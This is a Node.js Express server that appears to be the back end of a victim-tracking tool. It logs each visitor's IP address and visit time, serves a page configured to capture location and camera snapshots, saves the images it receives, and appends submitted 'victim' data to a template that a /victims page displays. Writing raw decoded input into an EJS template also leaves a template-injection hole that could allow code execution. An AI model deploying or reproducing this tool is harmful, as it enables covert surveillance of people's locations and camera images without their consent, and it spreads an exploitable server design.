const fs = require("fs");
const express = require("express");
var bodyParser = require("body-parser");
const base64ToImage = require("base64-to-image");
const config = require("./app").config;
var jsonParser = bodyParser.json({
  limit: 1024 * 1024 * 20,
  type: "application/json",
});
var urlencodedParser = bodyParser.urlencoded({
  extended: true,
  limit: 1024 * 1024 * 20,
  type: "application/x-www-form-urlencoded",
});
const app = express();
app.use(jsonParser);
app.use(urlencodedParser);
app.use(express.static("public"));
app.set("view engine", "ejs");
app.set("views", __dirname + "/views");
app.get("/", (req, res) => {
  var ip;
  var d = new Date();
  d = d.toJSON().slice(0, 19).replace("T", ":");
  if (req.headers["x-forwarded-for"]) {
    ip = req.headers["x-forwarded-for"].split(",")[0];
  } else if (req.connection && req.connection.remoteAddress) {
    ip = req.connection.remoteAddress;
  } else {
    ip = req.ip;
  }
  res.render("index", {
    ip: ip,
    time: d,
    redirect: config.redirectURL,
    camera: config.camera,
    cams: config.camsnaps,
    location: config.location,
  });
  fs.appendFile(
    "./views/log.txt",
    "Visit Form: " + ip + " | At:" + d + "\n\n",
    function (err) {
      if (err) throw err;
    }
  );
});
app.get("/victims", (req, res) => {
  // Read the current URL from a file, or use default
  let currentUrl = "https://9qj775-5000.csb.app/";
  try {
    if (fs.existsSync("./current_url.txt")) {
      currentUrl = fs.readFileSync("./current_url.txt", "utf8").trim();
    }
  } catch (err) {
    console.log("Using default URL");
  }
  
  res.render("victims", { currentUrl: currentUrl });
});

// Add route to update URL
app.post("/update-url", (req, res) => {
  const newUrl = req.body.url;
  if (newUrl) {
    fs.writeFileSync("./current_url.txt", newUrl);
    res.json({ success: true });
  } else {
    res.json({ success: false, error: "No URL provided" });
  }
});
app.post("/", (req, res) => {
  fs.appendFile(
    "./views/victims.ejs",
    decodeURIComponent(req.body.data) + "\n\n",
    function (err) {
      if (err) throw err;
      console.log("Saved!");
      res.send("Done");
    }
  );
});
app.post("/camsnap", (req, res) => {
  const path = "./public/images/";
  const { imageType, fileName } = base64ToImage(
    decodeURIComponent(req.body.img),
    path,
    { type: "png" }
  );
  res.send(fileName);
});
app.listen(5000, () => {
  console.log("App Running on Port 5000!");
});
